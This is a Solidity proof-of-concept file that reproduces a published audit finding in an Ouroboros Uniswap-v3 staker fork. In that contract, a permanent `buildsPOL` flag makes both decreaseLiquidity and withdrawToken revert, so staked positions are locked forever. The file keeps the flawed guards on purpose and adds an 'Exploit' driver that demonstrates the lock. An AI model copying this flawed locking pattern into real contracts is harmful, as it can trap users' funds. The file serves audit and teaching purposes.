// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Ouroboros finding 63445 (H-01):
// "Stakers may fail to claim all incentives" (Pashov Audit Group, 2025-06-30).
//
// Source is EMBEDDED in the finding (quoted from the audited repo). The two
// vulnerable lines the finding marks with @> are reproduced VERBATIM:
//   contract UniswapV3Staker  (Ouroboros fork of Uniswap's v3-staker)
//   fn decreaseLiquidity  ->  require(!deposits[tokenId].buildsPOL, 'E024');
//   fn withdrawToken       ->  require(!deposit.buildsPOL, 'E024');
//   report github.com/pashov/audits .../Ouroboros-security-review_2025-06-30.md
//
// Root cause: once a staked position is flagged `buildsPOL` (protocol-owned
// liquidity), that flag is PERMANENT. BOTH exit paths — `decreaseLiquidity`
// and `withdrawToken` — hard-`require(!buildsPOL, 'E024')`. There is no code
// path that ever clears `buildsPOL` back to false, so a staker who joins a
// POL-building incentive can NEVER decrease their liquidity nor withdraw their
// position NFT. The deposited Uniswap-v3 position (and all the underlying
// token liquidity it holds) is locked in the staker forever.
//
// The two `require(!... .buildsPOL, 'E024')` lines are byte-for-byte the
// on-chain source. The surrounding deposit / stake / unstake machinery and the
// position NFT are faithful minimal doubles (real ERC721 custody, real
// owner/numberOfStakes accounting). The lock emerges from the verbatim code,
// it is not asserted.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal interface so the verbatim `override` keywords compile unchanged.
interface IUniswapV3Staker {
    function decreaseLiquidity(
        uint256 tokenId,
        uint128 liquidity,
        uint256 amount0Min,
        uint256 amount1Min,
        uint256 deadline
    ) external returns (uint256 amount0, uint256 amount1);

    function withdrawToken(uint256 tokenId, address to, bytes memory data) external;
}

/// @dev Faithful minimal ERC721 double for the Uniswap NonfungiblePositionManager.
///      Each token carries the underlying liquidity value it represents so the
///      "locked value" is concrete, not a fabricated constant.
contract MockPositionNFT {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public valueOf; // underlying liquidity value of the position
    uint256 public nextId = 1;

    function mint(address to, uint256 liquidityValue) external returns (uint256 id) {
        id = nextId++;
        ownerOf[id] = to;
        valueOf[id] = liquidityValue;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) public {
        require(ownerOf[tokenId] == from, "not owner");
        ownerOf[tokenId] = to;
        if (_isContract(to)) {
            require(
                IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, data)
                    == IERC721Receiver.onERC721Received.selector,
                "bad receiver"
            );
        }
    }

    function _isContract(address a) internal view returns (bool) {
        return a.code.length > 0;
    }
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

/// @dev Faithful marker token used to register the permanently-locked position
///      value at the SINK (DoS / stuck-funds harm has no positive attacker transfer).
contract MarkerToken {
    string public name = "Ouroboros Locked POL Position";
    string public symbol = "oLOCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — Ouroboros fork of the Uniswap v3-staker. The two
// `require(!... .buildsPOL, 'E024')` lines inside `decreaseLiquidity` and
// `withdrawToken` are reproduced VERBATIM from the audited source and marked @>.
// ─────────────────────────────────────────────────────────────────────────────
contract UniswapV3Staker is IUniswapV3Staker, IERC721Receiver {
    struct Deposit {
        address owner;
        uint48 numberOfStakes;
        int24 tickLower;
        int24 tickUpper;
        bool buildsPOL;
    }

    mapping(uint256 => Deposit) public deposits;
    MockPositionNFT public nonfungiblePositionManager;

    constructor(MockPositionNFT npm_) {
        nonfungiblePositionManager = npm_;
    }

    // ── faithful custody double: receiving the NFT records the depositor ──
    function onERC721Received(address, address from, uint256 tokenId, bytes calldata)
        external
        override
        returns (bytes4)
    {
        require(msg.sender == address(nonfungiblePositionManager), "not the nft");
        deposits[tokenId] = Deposit({
            owner: from,
            numberOfStakes: 0,
            tickLower: -887220,
            tickUpper: 887220,
            buildsPOL: false
        });
        return IERC721Receiver.onERC721Received.selector;
    }

    // ── faithful stake into a POL-building incentive: sets the permanent flag ──
    function stakeToken(uint256 tokenId) external {
        require(deposits[tokenId].owner == msg.sender, 'E020');
        deposits[tokenId].numberOfStakes += 1;
        deposits[tokenId].buildsPOL = true; // POL incentive marks the position; never cleared anywhere
    }

    // ── faithful unstake: numberOfStakes returns to 0, buildsPOL stays true ──
    function unstakeToken(uint256 tokenId) external {
        require(deposits[tokenId].owner == msg.sender, 'E020');
        deposits[tokenId].numberOfStakes -= 1;
        // NOTE: no line anywhere resets deposits[tokenId].buildsPOL to false
    }

    function decreaseLiquidity(
        uint256 tokenId,
        uint128 liquidity,
        uint256 amount0Min,
        uint256 amount1Min,
        uint256 deadline
    ) external override returns (uint256 amount0, uint256 amount1) {
        // Only the position's owner can decrease liquidity.
        require(deposits[tokenId].owner == msg.sender, 'E020');

        require(!deposits[tokenId].buildsPOL, 'E024'); // @> VULN: POL flag is permanent, so a POL position can never decrease liquidity
    }

    function withdrawToken(
        uint256 tokenId,
        address to,
        bytes memory data
    ) external override {
        Deposit memory deposit = deposits[tokenId];
        require(deposit.numberOfStakes == 0, 'nonzero num of stakes');
        require(deposit.owner == msg.sender, 'only owner can withdraw token');

        // Tokens with POL cannot be withdrawn.
        require(!deposit.buildsPOL, 'E024'); // @> VULN: POL flag is permanent, so a POL position's NFT can never be withdrawn -> stuck

        delete deposits[tokenId];
        nonfungiblePositionManager.safeTransferFrom(address(this), to, tokenId, data);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a staker deposits a position NFT worth 1000e18 of liquidity,
// joins a POL-building incentive, then discovers BOTH exit paths revert 'E024'.
// The position is permanently locked. A control non-POL position withdraws fine,
// proving the lock is caused by the verbatim `buildsPOL` guards.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit is IERC721Receiver {
    MarkerToken public marker;
    MockPositionNFT public nft;
    UniswapV3Staker public vuln;

    uint256 public lockedValue;
    bool public decreaseReverted;
    bool public withdrawReverted;
    bool public stuck;
    bool public controlWithdrawSucceeded;

    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant POSITION_VALUE = 1000e18; // underlying liquidity the staked NFT holds

    constructor() {
        marker = new MarkerToken();       // child nonce 1 (profit / stuck marker)
        nft = new MockPositionNFT();      // child nonce 2
        vuln = new UniswapV3Staker(nft);  // child nonce 3 (VULN)
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function run() external {
        // ── control: a position that never joined a POL incentive (buildsPOL
        //    false) withdraws normally, proving the lock is caused solely by the
        //    verbatim `buildsPOL` guards, not by test setup ──
        uint256 plainId = nft.mint(address(this), 1e18);
        nft.safeTransferFrom(address(this), address(vuln), plainId, "");
        vuln.withdrawToken(plainId, address(this), ""); // never staked -> buildsPOL false -> succeeds
        controlWithdrawSucceeded = (nft.ownerOf(plainId) == address(this));

        // ── attack: deposit a valuable position and join a POL incentive ──
        uint256 tokenId = nft.mint(address(this), POSITION_VALUE);
        nft.safeTransferFrom(address(this), address(vuln), tokenId, "");
        vuln.stakeToken(tokenId);   // buildsPOL = true (permanent)
        vuln.unstakeToken(tokenId); // numberOfStakes back to 0, buildsPOL STILL true

        // both exit paths now hit the verbatim `require(!buildsPOL, 'E024')`
        try vuln.decreaseLiquidity(tokenId, 1, 0, 0, block.timestamp) {
            // should not reach here
        } catch {
            decreaseReverted = true;
        }

        try vuln.withdrawToken(tokenId, address(this), "") {
            // should not reach here
        } catch {
            withdrawReverted = true;
        }

        // the NFT (worth POSITION_VALUE) is stuck in the staker forever
        stuck = (nft.ownerOf(tokenId) == address(vuln));
        lockedValue = nft.valueOf(tokenId);

        // register the permanently-locked position value at the SINK
        marker.mint(SINK, lockedValue);

        // harm: staker's position is unrecoverable via BOTH exits -> funds stuck
        require(controlWithdrawSucceeded, "control non-POL withdrawal should succeed");
        require(decreaseReverted, "decreaseLiquidity did not revert (E024)");
        require(withdrawReverted, "withdrawToken did not revert (E024)");
        require(stuck, "position NFT not stuck in staker");
        require(marker.balanceOf(SINK) == POSITION_VALUE, "locked value not registered at sink");
    }
}
